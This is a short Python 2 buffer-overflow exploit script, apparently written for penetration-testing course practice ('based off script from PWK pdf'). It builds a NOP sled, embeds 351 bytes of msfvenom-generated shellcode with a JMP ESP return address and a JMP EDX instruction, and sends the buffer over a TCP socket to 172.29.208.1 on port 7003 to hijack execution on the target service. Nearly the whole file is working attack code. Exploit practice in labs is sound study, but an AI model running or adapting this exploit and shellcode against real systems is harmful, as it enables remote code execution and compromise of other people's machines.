#!/usr/bin/python2

# Based off script from PWK pdf (p. 382)

import socket;


buf = "\x90" * 1729
# 351 bytes according to 'msfvenom'
buf += "\xba\x92\xf5\x7e\xd7\xdb\xda\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\xc2\xfb\x9c"
buf += "\x22\x1e\xeb\xe3\xcd\xde\xec\x83\x44\x3b\xdd\x83\x33"
buf += "\x48\x4e\x34\x37\x1c\x63\xbf\x15\xb4\xf0\xcd\xb1\xbb"
buf += "\xb1\x78\xe4\xf2\x42\xd0\xd4\x95\xc0\x2b\x09\x75\xf8"
buf += "\xe3\x5c\x74\x3d\x19\xac\x24\x96\x55\x03\xd8\x93\x20"
buf += "\x98\x53\xef\xa5\x98\x80\xb8\xc4\x89\x17\xb2\x9e\x09"
buf += "\x96\x17\xab\x03\x80\x74\x96\xda\x3b\x4e\x6c\xdd\xed"
buf += "\x9e\x8d\x72\xd0\x2e\x7c\x8a\x15\x88\x9f\xf9\x6f\xea"
buf += "\x22\xfa\xb4\x90\xf8\x8f\x2e\x32\x8a\x28\x8a\xc2\x5f"
buf += "\xae\x59\xc8\x14\xa4\x05\xcd\xab\x69\x3e\xe9\x20\x8c"
buf += "\x90\x7b\x72\xab\x34\x27\x20\xd2\x6d\x8d\x87\xeb\x6d"
buf += "\x6e\x77\x4e\xe6\x83\x6c\xe3\xa5\xcb\x41\xce\x55\x0c"
buf += "\xce\x59\x26\x3e\x51\xf2\xa0\x72\x1a\xdc\x37\x74\x31"
buf += "\x98\xa7\x8b\xba\xd9\xee\x4f\xee\x89\x98\x66\x8f\x41"
buf += "\x58\x86\x5a\xc5\x08\x28\x35\xa6\xf8\x88\xe5\x4e\x12"
buf += "\x07\xd9\x6f\x1d\xcd\x72\x05\xe4\x86\xd0\xc7\x3c\xb8"
buf += "\x41\xfa\xc0\x45\xc2\x73\x26\x2f\xf2\xd5\xf1\xd8\x6b"
buf += "\x7c\x89\x79\x73\xaa\xf4\xba\xff\x59\x09\x74\x08\x17"
buf += "\x19\xe1\xf8\x62\x43\xa4\x07\x59\xeb\x2a\x95\x06\xeb"
buf += "\x25\x86\x90\xbc\x62\x78\xe9\x28\x9f\x23\x43\x4e\x62"
buf += "\xb5\xac\xca\xb9\x06\x32\xd3\x4c\x32\x10\xc3\x88\xbb"
buf += "\x1c\xb7\x44\xea\xca\x61\x23\x44\xbd\xdb\xfd\x3b\x17"
buf += "\x8b\x78\x70\xa8\xcd\x84\x5d\x5e\x31\x34\x08\x27\x4e"
buf += "\xf9\xdc\xaf\x37\xe7\x7c\x4f\xe2\xa3\x8d\x1a\xae\x82"
buf += "\x05\xc3\x3b\x97\x4b\xf4\x96\xd4\x75\x77\x12\xa5\x81"
buf += "\x67\x57\xa0\xce\x2f\x84\xd8\x5f\xda\xaa\x4f\x5f\xcf"
buf += "\x1E\x11\x80\x14" # Address of a "JMP ESP" instruction
buf += "\xFF\xE2" # JMP EDX
buf += "\x90" * 142

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("172.29.208.1", 7003))
s.send(buf)

s.close()

print("Done")

